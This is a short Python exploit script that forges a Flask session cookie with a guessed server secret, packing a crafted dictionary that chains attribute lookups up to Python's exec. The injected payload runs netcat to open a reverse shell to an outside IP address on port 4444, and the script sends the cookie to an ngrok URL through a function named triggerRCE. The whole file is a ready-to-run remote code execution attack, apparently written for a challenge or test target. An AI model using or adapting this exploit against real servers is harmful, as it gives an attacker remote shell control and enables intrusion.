#!/usr/bin/env python
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer
import requests

R_URL = "https://5707-175-45-191-252.ngrok-free.app/"

class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface):
    # Override method
    # Take secret_key instead of an instance of a Flask app
    def get_signing_serializer(self, secret_key):
        if not secret_key:
            return None
        signer_kwargs = dict(
            key_derivation=self.key_derivation,
            digest_method=self.digest_method
        )
        return URLSafeTimedSerializer(secret_key, salt=self.salt,
                                      serializer=self.serializer,
                                      signer_kwargs=signer_kwargs)


def decodeFlaskCookie(secret_key, cookieValue):
    sscsi = SimpleSecureCookieSessionInterface()
    signingSerializer = sscsi.get_signing_serializer(secret_key)
    return signingSerializer.loads(cookieValue)

# Keep in mind that flask uses unicode strings for the
# dictionary keys


def encodeFlaskCookie(secret_key, cookieDict):
    sscsi = SimpleSecureCookieSessionInterface()
    signingSerializer = sscsi.get_signing_serializer(secret_key)
    return signingSerializer.dumps(cookieDict)

def triggerRCE(cookie):
    return requests.get(R_URL, cookies={"session": cookie})

if __name__ == '__main__':
    sk = 'SameAsTheServerSecret'
    sessionDict = {'books': {
        "    __class__.__class_getitem__": "!__reduce_ex__",
        "   newobj": "!__class__.3.0",
        "  __class__.__class_getitem__": "!newobj.__getattribute__",
        " __class__.__getattr__": "!__class__.__builtins__.exec",
        "import os; os\.system('nc 108\.137\.37\.157 4444 -e sh & sleep 10')": "x",
    }}
    cookie = encodeFlaskCookie(sk, sessionDict)
    res = triggerRCE(cookie)
    print(res.text)
